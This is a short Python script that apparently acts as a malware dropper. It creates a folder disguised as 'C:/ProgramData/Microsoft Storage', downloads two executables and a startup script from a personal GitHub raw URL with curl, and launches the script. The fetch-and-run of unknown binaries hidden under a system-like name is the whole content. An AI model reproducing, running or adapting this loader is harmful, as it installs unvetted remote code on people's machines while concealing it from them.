import os

directory = "C:/ProgramData/Microsoft Storage"
os.makedirs(directory, exist_ok=True)
os.chdir(directory)

files = [
    "clo.exe",
    "file.exe", 
    "startup.py"
]

base_url = "https://raw.githubusercontent.com/Fghghssss/BUSB/refs/heads/main/"

for file in files:
    os.system(f"curl -O {base_url}{file}")
os.system("start startup.py")
